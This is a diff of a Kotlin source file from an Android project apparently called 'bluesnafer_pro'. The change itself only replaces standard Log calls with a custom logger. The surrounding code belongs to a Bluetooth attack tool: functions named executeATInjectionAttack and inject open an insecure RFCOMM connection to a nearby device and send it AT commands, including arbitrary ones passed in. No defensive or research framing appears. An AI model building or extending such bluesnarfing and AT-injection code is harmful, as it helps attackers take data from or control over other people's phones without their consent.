@@ -1,7 +1,6 @@
 package com.bluesnafer_pro
 
 import android.bluetooth.*
-import android.util.Log
 import java.io.*
 import java.util.*
 import java.util.concurrent.Executors
@@ -19,7 +18,7 @@ object RealATInjection {
      * Connects via RFCOMM and sends AT commands
      */
     fun executeATInjectionAttack(device: BluetoothDevice): Map<String, Any> {
-        Log.d(TAG, "AT Injection Attack - connecting to ${device.address}")
+        BluesnaferLogger.d(TAG, "AT Injection Attack - connecting to ${device.address}")
         
         return try {
             // Try to connect to a serial port profile (SPP) or use direct AT commands
@@ -27,7 +26,7 @@ object RealATInjection {
             
             val socket = device.createInsecureRfcommSocketToServiceRecord(sppUUID)
             socket.connect()
-            Log.d(TAG, "RFCOMM connected for AT commands")
+            BluesnaferLogger.d(TAG, "RFCOMM connected for AT commands")
             
             val input = socket.inputStream
             val output = socket.outputStream
@@ -47,7 +46,7 @@ object RealATInjection {
             
             if (bytesRead > 0) {
                 val responseStr = String(response, 0, bytesRead, Charsets.UTF_8)
-                Log.d(TAG, "AT Response: $responseStr")
+                BluesnaferLogger.d(TAG, "AT Response: $responseStr")
                 
                 results.add(mapOf(
                     "command" to "AT",
@@ -96,7 +95,7 @@ object RealATInjection {
                 "count" to results.size
             )
         } catch (e: Exception) {
-            Log.e(TAG, "AT Injection error: ${e.message}")
+            BluesnaferLogger.e(TAG, "AT Injection error: ${e.message}")
             mapOf(
                 "success" to false,
                 "response" to "AT Injection failed: ${e.message}",
@@ -109,7 +108,7 @@ object RealATInjection {
      * Inject specific AT command
      */
     fun inject(device: BluetoothDevice, command: String, onLog: (String) -> Unit): Map<String, Any> {
-        Log.d(TAG, "AT Injection - command: $command")
+        BluesnaferLogger.d(TAG, "AT Injection - command: $command")
         onLog("[AT] Injecting command: $command")
         
         return try {
@@ -153,7 +152,7 @@ object RealATInjection {
             onLog("[AT] ✗ No response received")
             mapOf("success" to false, "response" to "No response")
         } catch (e: Exception) {
-            Log.e(TAG, "AT inject error: ${e.message}")
+            BluesnaferLogger.e(TAG, "AT inject error: ${e.message}")
             onLog("[AT] ✗ Error: ${e.message}")
             mapOf("success" to false, "response" to (e.message ?: "Unknown error"))
         }
